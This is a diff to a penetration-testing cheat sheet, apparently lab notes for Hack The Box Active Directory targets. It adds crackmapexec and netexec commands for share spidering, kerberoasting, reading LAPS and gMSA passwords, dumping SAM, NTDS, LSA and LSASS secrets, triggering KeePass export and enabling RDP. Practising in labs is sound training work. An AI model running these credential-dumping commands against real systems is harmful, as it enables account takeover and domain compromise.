@@ -638,7 +638,7 @@ medusa -h 192.168.168.108 -u postgres -P /usr/share/seclists/Passwords/UserPassC
 ```
 ## hashcrack
 ```bash
-# MD5-RAW: 0, SHA-256: 1400, NTLM: 1000, NetNTLMv2: 5600, AS-REP: 18200, TGS-REP: 13100
+# MD5-RAW: 0, SHA-256: 1400, NTLM: 1000, NetNTLMv2: 5600, AS-REP: 18200, TGS-REP: 13100, DCC2: 2100
 hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt -r /usr/share/john/rules/best64.rule --force
 
 # john
@@ -656,6 +656,11 @@ crackmapexec smb 192.168.226.189 192.168.226.191 192.168.226.248-249 -u user -H 
 crackmapexec smb 10.129.144.138 -u "guest" -p "" --rid-brute --pass-pol
 crackmapexec smb 10.129.144.138 -u user_list -p user_list --no-brute
 
+# SMB share
+nxc smb 10.129.204.177 -u username -p 'Nexus123!' -d inlanefreight.htb --shares
+nxc smb 10.129.204.177 -u username -p 'Nexus123!' -d inlanefreight.htb --spider serviceaccount --regex .
+nxc smb 10.129.204.177 -u username -p 'Nexus123!' -d inlanefreight.htb --share serviceaccount --get-file flag.txt flag.txt
+
 # pass-pol
 crackmapexec smb 10.129.204.177  -u '' -p '' --pass-pol
 
@@ -663,6 +668,37 @@ crackmapexec smb 10.129.204.177  -u '' -p '' --pass-pol
 ## gpp-decryp cmd
 crackmapexec smb 192.168.50.75 -u username -p 'Nexus123!' -M gpp_password
 crackmapexec smb 192.168.50.75 -u username -p 'Nexus123!' -M gpp_autologin
+
+# kerberoasting
+crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --kerberoasting kerberoasting.out
+# Kerberos Unconstrained Delegation
+crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --trusted-for-delegation
+# No password
+crackmapexec ldap 10.129.204.177 -u username -p 'Nexus123!' -d inlanefreight.htb --password-not-required
+
+# sid
+crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --get-sid
+# MS-DS-Machine-Account-Quota
+crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' -M maq
+# gMSA
+crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --gmsa
+# laps
+crackmapexec ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' -M laps
+
+# secret dump
+crackmapexec smb 10.129.204.177 -u username -p 'Nexus123!' --sam
+crackmapexec smb 10.129.204.177 -u username -p 'Nexus123!' --ntds --enabled
+crackmapexec smb 10.129.204.177 -u username -p 'Nexus123!' --lsa 
+crackmapexec smb 10.129.204.177 -u username -p 'Nexus123!' -M lsassy
+crackmapexec smb 10.129.204.177 -u username -p 'Nexus123!' -M handlekatz
+crackmapexec smb 10.129.204.177 -u username -p 'Nexus123!' -M nanodump
+## KeePass
+crackmapexec smb 10.129.203.121 -u username -p 'Nexus123!' -M keepass_discover
+nxc smb 10.129.105.44 -u username -p 'Nexus123!' -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/CreatePass/KeePass.config.xml'
+
+## Enable RDP
+crackmapexec smb 10.129.203.121 -u username -p 'Nexus123!' -M rdp -o ACTION=enable
+crackmapexec smb 10.129.203.121 -u username -p 'Nexus123!' -M rdp -o ACTION=disable
 ```
 ### PsMapexec
 ```powershell
@@ -1568,6 +1604,9 @@ https://github.com/jpillora/chisel/releases
 # tail /etc/proxychains4.conf
 [ProxyList]
 socks5 127.0.0.1 1080
+
+# stop chisel
+Stop-Process -Name chisel -Force
 ```
 ### Ligolo-ng
 https://github.com/nicocha30/ligolo-ng/releases
